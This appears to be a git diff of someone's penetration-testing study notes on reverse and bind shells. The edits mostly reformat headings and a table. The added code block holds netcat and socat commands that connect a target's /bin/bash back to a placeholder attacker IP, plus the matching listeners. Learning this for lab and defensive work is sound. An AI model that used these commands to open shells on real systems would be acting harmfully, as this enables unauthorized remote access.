@@ -3,16 +3,16 @@
 author:: Nathan Acks  
 date:: 2021-10-27
 
-## What the Shell?
+# What the Shell?
 
-### What Is a Shell?
+## What Is a Shell?
 
 Terminology:
 
 * REVERSE SHELLS are shells where the target is forced to connect back to the attacker.
 * BIND SHELLS are shells bound to a port on the target that the attacker can connect to later.
 
-### Tools
+## Tools
 
 Typical tools for creating reverse shells or connecting to bind shells:
 
@@ -30,7 +30,7 @@ Also check out /usr/share/webshells on Kali Linux.
 
 * [Using Metasploit](../notes/metasploit.md)
 
-### Types of Shells
+## Types of Shells
 
 Example reverse shell:
 
@@ -46,11 +46,11 @@ These are almost, but not quite, mirror images of each other.
 
 Most initial reverse shells (in particular web shells) are non-interactive.
 
-### Netcat
+## Netcat
 
 While binding to well-known ports requires the use of sudo, it's also less likely to get flagged/blocked by intermediate firewalls.
 
-### Netcat Shell Stabilization
+## Netcat Shell Stabilization
 
 One thing that causes a reverse shell to be non-interactive is when its running in a shell itself. It's generally possible to stabilize these and get a fully interactive shell on UNIX-like systems:
 
@@ -71,16 +71,31 @@ NOTE that in *none* of these cases will the reverse shell pick up on your termin
 
 * [Quick-n-Dirty Python Web Server](../notes/quick-n-dirty-python-web-server.md)
 
-### Socat
+## Socat
 
 Socat: Just an anything-to-anything connector!
 
-| Role                     | netcat                                        | socat                                                        |
-|:------------------------ |:--------------------------------------------- |:------------------------------------------------------------ |
-| Reverse shell (attacker) | `nc -lnp $LISTENER_PORT`                      | `socat TCP-LISTEN:$LISTENER_PORT -`                          |
-| Reverse shell (target)   | `nc $ATTACKER_IP $LISTENER_PORT -e /bin/bash` | `socat TCP:$ATTACKER_IP:$LISTENER_PORT EXEC:"/bin/bash -li"` |
-| Bind shell (attacker)    | `nc $TARGET_IP $LISTENER_PORT`                | `socat TCP:$TARGET_IP:$LISTENER_PORT`                        |
-| Bind shell (target)      | `nc -lnp $LISTENER_PORT -e /bin/bash`         | `socat TCP-LISTEN:$LISTENER_PORT EXEC:"/bin/bash -li"`       |
+```bash
+# Reverse shell (attacker)
+#
+nc -lnp $LISTENER_PORT
+socat TCP-LISTEN:$LISTENER_PORT -
+
+# Reverse shell (target)
+#
+nc $ATTACKER_IP $LISTENER_PORT -e /bin/bash
+socat TCP:$ATTACKER_IP:$LISTENER_PORT EXEC:"/bin/bash -li"
+
+# Bind shell (attacker)
+#
+nc $TARGET_IP $LISTENER_PORT
+socat TCP:$TARGET_IP:$LISTENER_PORT
+
+# Bind shell (target)
+#
+nc -lnp $LISTENER_PORT -e /bin/bash
+socat TCP-LISTEN:$LISTENER_PORT EXEC:"/bin/bash -li"
+```
 
 This gets us an interactive login shell right out the gate, though we're still vulnerable to Ctrl+C. Note that when binding to PowerShell, use `powershell.exe,pipes` in order to force PowerShell to use UNIX-style STDIN/STDOUT.
 
